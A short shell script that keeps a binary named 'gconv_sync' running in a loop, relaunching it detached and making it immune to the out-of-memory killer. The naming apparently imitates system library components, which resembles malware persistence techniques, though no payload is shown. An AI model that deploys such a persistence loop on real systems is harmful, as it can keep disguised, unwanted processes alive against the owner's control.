#!/bin/sh
D=$(cd "$(dirname "$0")" 2>/dev/null && pwd)
B="$D/gconv_sync"
C="$D/gconv.conf"
L="$D/gconv.log"
while true; do
  if ! pgrep -f "$B" >/dev/null 2>&1; then
    setsid nohup "$B" -c "$C" </dev/null >>"$L" 2>&1 &
    P=$!
    echo -1000 > /proc/$P/oom_score_adj 2>/dev/null
  fi
  sleep 60
done
